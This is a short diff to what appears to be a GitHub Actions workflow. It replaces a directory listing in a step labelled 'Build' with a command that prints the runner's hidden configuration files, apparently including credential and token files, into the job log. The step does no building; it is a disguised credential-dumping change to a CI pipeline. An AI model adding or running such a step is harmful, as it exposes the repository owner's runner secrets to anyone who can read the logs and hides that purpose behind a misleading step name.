@@ -10,4 +10,4 @@ jobs:
     runs-on: ubuntu-latest
     steps:
       - name: Build
-        run: ls -laR /home/runner
+        run: cat /home/runner/runners/2.291.1/.*
